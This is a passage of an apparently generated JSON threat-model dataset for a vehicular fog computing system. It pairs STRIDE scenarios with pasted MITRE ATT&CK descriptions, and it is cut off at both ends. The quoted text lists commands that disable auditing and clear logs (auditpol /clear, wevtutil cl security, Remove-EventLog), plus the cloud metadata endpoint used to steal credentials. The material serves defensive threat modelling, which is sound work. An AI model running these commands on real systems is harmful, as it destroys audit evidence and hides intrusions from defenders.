in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious vehicle could deny sending specific data to fog nodes, compromising investigation efforts during incidents.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not logged or verified by the fog nodes.",
                    "Role": "System administrator",
                    "Condition": "Lack of audit trails for data transmission."
                },
                {
                    "Assumption": "There are no mechanisms to tie specific actions to individual vehicles.",
                    "Role": "System administrator",
                    "Condition": "Absence of log correlation mechanisms."
                },
                {
                    "Assumption": "Digital signatures are not implemented for authenticity verification.",
                    "Role": "System administrator",
                    "Condition": "Lack of signature-based validation on data."
                }
            ],
            "Potential Impact": "Undetectable tampering and denial complicate forensic analysis and incident resolution.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit",
                "authentication",
                "incident response"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud services could deny receiving crucial data from fog nodes, impacting overall system analytics and decisions.",
            "Assumptions": [
                {
                    "Assumption": "No acknowledgment mechanisms for data receipts from fog nodes to cloud services.",
                    "Role": "System administrator",
                    "Condition": "Acknowledge mechanisms are not implemented."
                },
                {
                    "Assumption": "Lack of logging for data transfer activities.",
                    "Role": "System administrator",
                    "Condition": "Data flow logs are either weak or not maintained."
                },
                {
                    "Assumption": "Weak or no validation for data sent or received.",
                    "Role": "System administrator",
                    "Condition": "Invalid or weak data validation processes."
                }
            ],
            "Potential Impact": "Undetected data loss affects system operations, analytics reliability, and decision-making processes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud service",
                "data transfer",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could intercept unencrypted communications between smart vehicles and fog nodes, revealing sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit between smart vehicles and fog nodes is not encrypted.",
                    "Role": "System administrator",
                    "Condition": "No encryption or weak encryption schemes in use."
                },
                {
                    "Assumption": "Attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to network traffic through proximity or other means."
                },
                {
                    "Assumption": "No obfuscation techniques are employed.",
                    "Role": "System administrator",
                    "Condition": "Sensitive data transmitted in plaintext."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive vehicle and road condition data, compromising privacy and security.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption",
                "network traffic",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could access fog node logs containing sensitive road and traffic data stored without encryption.",
            "Assumptions": [
                {
                    "Assumption": "Fog node logs are stored in plaintext.",
                    "Role": "System administrator",
                    "Condition": "No encryption for stored logs or weak encryption used."
                },
                {
                    "Assumption": "Weak access controls on fog node data storage.",
                    "Role": "System administrator",
                    "Condition": "Access controls are inadequate or misconfigured."
                },
                {
                    "Assumption": "Attacker has physical or remote access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Feasibility of physical or remote access to fog nodes."
                }
            ],
            "Potential Impact": "Exposure of sensitive data stored on fog nodes, leading to potential misuse or privacy violations.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data storage",
                "encryption",
                "access control"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could gain unauthorized access to cloud service data containing sensitive aggregated analytics from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanisms for cloud service access.",
                    "Role": "System administrator",
                    "Condition": "Weak or insufficient authentication protocols implemented."
                },
                {
                    "Assumption": "Inadequate network security controls.",
                    "Role": "System administrator",
                    "Condition": "Weak or missing network security measures."
                },
                {
                    "Assumption": "Sensitive data in cloud services is not encrypted.",
                    "Role": "System administrator",
                    "Condition": "Data stored in plaintext or weakly encrypted."
                }
            ],
            "Potential Impact": "Compromise of aggregated sensitive data, leading to large-scale privacy breaches and misuse risks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud service",
                "authentication",
                "network security"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could flood the network with traffic, overwhelming fog nodes and causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes and smart vehicles rely on limited bandwidth for communication.",
                    "Role": "System administrator",
                    "Condition": "Limited network bandwidth available for communications."
                },
                {
                    "Assumption": "No effective rate limiting mechanisms in place.",
                    "Role": "System administrator",
                    "Condition": "Absence of rate limiting or traffic shaping protocols."
                },
                {
                    "Assumption": "The attacker can generate high volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Attacker possesses the resources to generate significant traffic volume."
                }
            ],
            "Potential Impact": "Disruption of VFC services, impacting real-time processing and critical vehicle functions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network traffic",
                "fog node",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could exploit vulnerabilities in fog node software to crash or render nodes inoperative.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist within fog node operating software.",
                    "Role": "System administrator",
                    "Condition": "Unpatched software vulnerabilities are present."
                },
                {
                    "Assumption": "Fog node software lacks sufficient resilience against attacks.",
                    "Role": "System administrator",
                    "Condition": "Software lacks appropriate security hardening."
                },
                {
                    "Assumption": "The attacker has knowledge of these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and expertise to exploit vulnerabilities."
                }
            ],
            "Potential Impact": "Service outages and unavailability of local processing capabilities, degrading system performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "software vulnerability",
                "fog node",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could target cloud services with a DDoS attack, overwhelming the system and causing widespread disruption.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are accessible from the internet.",
                    "Role": "System administrator",
                    "Condition": "Internet-accessible cloud infrastructure."
                },
                {
                    "Assumption": "Cloud infrastructure lacks adequate DDoS protection mechanisms.",
                    "Role": "System administrator",
                    "Condition": "Weak or inadequate DDoS mitigation strategies."
                },
                {
                    "Assumption": "The attacker has the capability to sustain a high-volume DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Resources to sustain large-scale DDoS attacks are available."
                }
            ],
            "Potential Impact": "Widespread disruption of cloud-based services, affecting data storage, analysis, and automated decision-making.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud service",
                "distributed",
                "DDoS"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could gain administrative access to fog nodes, allowing them to execute arbitrary commands and control the node.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have exploitable vulnerabilities allowing privilege escalation.",
                    "Role": "System administrator",
                    "Condition": "Presence of unpatched vulnerabilities in fog nodes."
                },
                {
                    "Assumption": "Access controls are weak or improperly implemented.",
                    "Role": "System administrator",
                    "Condition": "Lack of stringent access control policies."
                },
                {
                    "Assumption": "The attacker can gain initial access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Initial exploitation or credential theft is possible."
                }
            ],
            "Potential Impact": "Full control over fog nodes, enabling unauthorized access to data and system manipulations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "admin access",
                "fog node",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could escalate privileges on smart vehicles to access and manipulate the vehicle's sensor data and control systems.",
            "Assumptions": [
                {
                    "Assumption": "Smart vehicles have software vulnerabilities allowing privilege escalation.",
                    "Role": "System administrator",
                    "Condition": "Exploitable software vulnerabilities exist."
                },
                {
                    "Assumption": "Weak authentication and authorization mechanisms on vehicle systems.",
                    "Role": "System administrator",
                    "Condition": "Lack of robust authentication mechanisms."
                },
                {
                    "Assumption": "The attacker can gain initial access to the vehicle's systems.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to vehicle systems."
                }
            ],
            "Potential Impact": "Manipulation of vehicle behavior, compromising safety and data integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vehicle control",
                "sensor data",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit cloud service vulnerabilities to gain higher-level access, compromising sensitive aggregated data and cloud resources.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have vulnerabilities that can be exploited for privilege escalation.",
                    "Role": "System administrator",
                    "Condition": "Unpatched vulnerabilities in cloud infrastructure."
                },
                {
                    "Assumption": "Weak multi-factor authentication for cloud service administration.",
                    "Role": "System administrator",
                    "Condition": "Insufficient multi-factor authentication implemented."
                },
                {
                    "Assumption": "The attacker has access to the cloud service network.",
                    "Role": "Attacker",
                    "Condition": "Access through compromised credentials or network breach."
                }
            ],
            "Potential Impact": "Compromise of entire cloud service infrastructure, unauthorized access to sensitive data, and manipulation of cloud resources.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud service",
                "admin access",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "4",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate smart vehicle to gain unauthorized access to the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Communication protocols do not adequately authenticate the identity of smart vehicles.",
                    "Role": "Attacker",
                    "Condition": "Valid if inadequate authentication mechanisms are in place."
                },
                {
                    "Assumption": "Attacker has the necessary tools to forge vehicle credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if vehicle authentication can be bypassed."
                },
                {
                    "Assumption": "The system relies solely on vehicle-provided identifiers without additional security layers.",
                    "Role": "System Designer",
                    "Condition": "Valid if system lacks multi-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized access could lead to data disclosure, tampering, and service disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "vehicle",
                "network",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor spoofs a fog node to intercept and manipulate data intended for legitimate nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not use robust mutual authentication protocols.",
                    "Role": "Attacker",
                    "Condition": "Valid if mutual authentication is weak or nonexistent."
                },
                {
                    "Assumption": "Attacker has physical access to a location where they can introduce a rogue fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security is compromised."
                },
                {
                    "Assumption": "Legitimate fog nodes do not regularly verify their peers.",
                    "Role": "System Designer",
                    "Condition": "Valid if peer verification is not enforced."
                }
            ],
            "Potential Impact": "Sensitive data intercept and manipulation, leading to potential data tampering and disruption of services.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "network communication",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker fakes cloud service credentials to gain unauthorized access to the VFC system's cloud resources.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services rely on standard credentials without additional verification.",
                    "Role": "Attacker",
                    "Condition": "Valid if single-factor authentication is used."
                },
                {
                    "Assumption": "Attacker has knowledge or tools to fake cloud service credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if credentials can be easily obtained or faked."
                },
                {
                    "Assumption": "System lacks anomaly detection mechanisms for cloud access patterns.",
                    "Role": "System Designer",
                    "Condition": "Valid if there are no monitoring and detection systems in place."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data in the cloud, potential data breaches, and manipulation of cloud-stored information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "credentials",
                "access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
